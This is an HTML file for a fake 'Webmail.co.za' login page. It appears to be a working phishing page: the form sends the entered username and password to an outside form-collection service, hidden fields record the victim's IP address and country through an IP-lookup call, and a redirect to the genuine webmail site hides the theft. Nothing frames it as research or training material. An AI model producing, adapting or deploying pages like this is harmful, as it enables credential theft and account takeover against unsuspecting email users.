<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Webmail Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh;">

  <!-- Login Form -->
  <div id="formcontainer" style="background-color: white; padding: 40px 30px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); border-radius: 8px; width: 350px; text-align: center;">
    <div class="EmailIcon" style="font-size: 40px; color: #007BFF; margin-bottom: 10px;">
      <i class="fa-solid fa-envelope"></i>
    </div>
    <h3 style="margin-bottom: 30px; color: #003b5c;">Webmail.co.za</h3>

    <form id="webmailForm" action="https://submit-form.com/g0Zhf3MZS" method="POST">
      <label for="username" style="display: block; text-align: left; margin-bottom: 5px;">Username</label>
      <input type="text" id="username" name="username" placeholder="Username" required style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px;">

      <label for="password" style="display: block; text-align: left; margin-bottom: 5px;">Password</label>
      <input type="password" id="password" name="password" placeholder="Password" required style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px;">

      <!-- Hidden Fields for IP & Country -->
      <input type="hidden" name="ip_address" id="ip_address">
      <input type="hidden" name="country" id="country">

      <!-- Optional redirect after submission -->
      <input type="hidden" name="_redirect" value="https://app.webmail.co.za/">

      <button type="submit" style="width: 100%; padding: 12px; background-color: #007BFF; color: white; font-size: 16px; border: none; border-radius: 4px; cursor: pointer;">Login</button>
    </form>
  </div>

  <script>
    // Get IP and country from ipwho.is API and set hidden inputs
    fetch("https://ipwho.is/")
      .then(res => res.json())
      .then(data => {
        document.getElementById("ip_address").value = data.ip || "";
        document.getElementById("country").value = data.country || "";
      })
      .catch(err => console.error("IP lookup failed:", err));
  </script>

</body>
</html>
